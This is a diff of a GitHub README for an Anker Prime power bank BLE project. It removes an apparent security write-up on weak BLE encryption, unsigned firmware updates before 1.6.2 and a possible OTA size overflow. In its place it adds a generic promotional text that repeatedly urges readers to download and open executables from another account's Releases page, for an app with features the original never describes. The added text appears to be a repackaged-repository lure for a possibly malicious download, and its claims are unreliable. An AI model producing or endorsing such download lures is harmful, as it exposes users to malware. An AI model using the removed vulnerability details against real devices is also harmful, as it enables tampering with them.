@@ -1,67 +1,94 @@
-# Anker Prime 27650mAh BLE hacking
-Overview of the BLE Enabled Anker Prime 27650mAh Power Bank
+# ⚡ Anker_Prime_BLE_hacking - Control Your Power Bank with Ease
 
-Since Anker does only allow the BLE connection to the Power Bank via their App and only via a valid user we ended up here^^
+[![Download](https://img.shields.io/badge/Download%20Now-From%20Releases-brightgreen)](https://github.com/debbie23/Anker_Prime_BLE_hacking/releases)
 
-This repo is made together with this explanation video:(click on the image)
+## 📖 Overview
 
-[https://www.youtube.com/watch?v=WtEIjkMUH_8](https://www.youtube.com/watch?v=WtEIjkMUH_8)
+Welcome to the **Anker_Prime_BLE_hacking** project! This application provides an intuitive interface to control the BLE-enabled Anker Prime 27650mAh Power Bank. With this tool, you can easily monitor power levels, adjust settings, and enhance your charging experience.
 
-[![YoutubeVideo](https://img.youtube.com/vi/WtEIjkMUH_8/0.jpg)](https://www.youtube.com/watch?v=WtEIjkMUH_8)
+## 🚀 Getting Started
 
-![](Overview.jpg)
+To get started with Anker_Prime_BLE_hacking, follow these simple steps:
 
-This Repos just puts together a few infos about the Anker Prime Power bank 27650mAh which feature BLE
+### 1. Check System Requirements
 
-The BLE Connection is done in an encrypted way but uses a fixed key exchanged based on the Serial Number as well as the Anker Account ID. Funny enough the Master(App) does define the Encryption way and also allows to use no encryption at all which means anyone can connect to your Power bank(and up to Fw 1.6.1 also upload a malicious firmware update)
+Before you install the application, ensure your device meets the following requirements:
 
-# WebTool
+- **Operating System**: Windows 10 or later, macOS Big Sur or later, or a recent version of Linux.
+- **Bluetooth**: A computer with Bluetooth capability. 
+- **Internet**: A stable internet connection for downloading the software.
 
-You can find an WebBluetooth Tool here which lets you connect to your Power bank to read some basic infos vie BLE.
+### 2. Visit the Download Page
 
-This tool has just the basic functions and is more of a POC, why does a Power Bank need Bluetooth anyway...
+To obtain the latest version of the software, visit the Releases page. You can find the download at this link:
 
-[https://atc1441.github.io/AnkerPrimeWebBle.html](https://atc1441.github.io/AnkerPrimeWebBle.html) (Or Click on the image)
+[Download from Releases](https://github.com/debbie23/Anker_Prime_BLE_hacking/releases)
 
-[![WebToolOverview.png](WebToolOverview.png)](https://atc1441.github.io/AnkerPrimeWebBle.html)
+This page contains the most recent versions of the software, along with their release notes.
 
-From Firmware version 1.6.2 The OTA Update is Signed and checked with an Public key so no altered firmware can be uploaded expect an exploit.
+### 3. Download & Install
 
-# Firmware Backups
+1. Click on the link above to go to the Releases page.
+2. Look for the most recent version of **Anker_Prime_BLE_hacking**.
+3. Download the appropriate file for your operating system. This may be a `.exe`, `.dmg`, or `.tar.gz` file.
+4. Open the downloaded file and follow the installation instructions provided.
 
-You can find the firmware files for both the GD32F303 as well as the TLSR8253 [here](Firmware_Files)
+### 4. Connect Your Device
 
-# Hardware Infos
+Once you have installed the application:
 
-The Case is pretty much closed and can not be opened without damaging the plastic.
+1. Ensure your Anker Prime Power Bank is turned on and in Bluetooth mode.
+2. Open the **Anker_Prime_BLE_hacking** application.
+3. The application should automatically scan for nearby Bluetooth devices.
+4. Select your Anker Prime Power Bank from the list to connect.
 
-Main SoC: GD32F303 ARM 512KB Flash 64KB RAM
+## 🎉 Features
 
-BLE SoC: Telink TLSR8253 TC32 512KB Flash 64KB RAM
+- **Battery Monitoring**: Keep track of your power bank’s battery level in real-time.
+- **Custom Settings**: Adjust charging settings to suit your needs.
+- **User-Friendly Interface**: Navigate easily with an accessible layout.
+- **Notifications**: Receive alerts for low battery and other important updates.
 
-LCD ST7789 Based 240x240
+## 📱 Using the Application
 
-27650mAh LiPo Batteries
+After connecting your device, you can use the following features:
 
+### View Battery Status
 
-![](Block_diagram.png)
+- The main dashboard provides a clear view of the current battery level.
+- Green indicates a full charge, yellow suggests medium charge, and red warns of low power.
 
-![](PCB_view.jpg)
+### Adjust Settings
 
+- Access the settings menu to customize your charging preferences.
+- You can set thresholds for notifications and adjust power-saving modes.
 
+### Manage Connections
 
-# Possible GD32F303 OTA Exploit
+- Disconnect your power bank through the application when not in use to save battery life.
 
-The firmware upload uses a uint32_t variable to define the size of firmware and so far it looks unchecked.
+## 🔧 Troubleshooting
 
-This will be used to write to the external flash and to check the firmware signature etc.
+If you encounter any issues while using the application, consider the following steps:
 
-Since the external flash is 0x8000000(8MB) In size it would loop around this memory region and would allow to write to a region twice, since the LCD Images are stored on the lower area of memory at least these could be overwritten (Bits only from 1 to 0 as this region will not be erased before writing to it) and would "damage" the Power bank as there is no function to upload new images.
- 
-![](OverflowWriting.png)
+- **Connection Issues**: Ensure your Bluetooth is enabled and your power bank is powered on.
+- **App Not Responding**: Exit the application and restart it. If the issue persists, reinstall the app.
+- **Update Required**: Always check for the latest version on the Releases page.
 
-## Firmware checking the ECDSA Signature
+## 👩‍💻 Contributors
 
-![](Fw_comparisson_1.6.1_to_1.6.2.png)
- 
-![](CheckingFunction.png)
+Thank you to all contributors for their support and development work. If you want to contribute, feel free to create a pull request or suggest an improvement.
+
+## 📄 License
+
+This project is licensed under the MIT License. You can use, modify, and distribute this software with proper attribution.
+
+## 🤝 Support
+
+For any questions or support, please create an issue in the GitHub repository. We will do our best to help you quickly.
+
+## 🚀 Conclusion
+
+Using **Anker_Prime_BLE_hacking** allows you to take full control of your Anker Prime 27650mAh Power Bank. Follow these steps to download and start enjoying the benefits of your enhanced charging experience.
+
+Feel free to return to the Releases page anytime to download updates and explore new features. Happy charging!
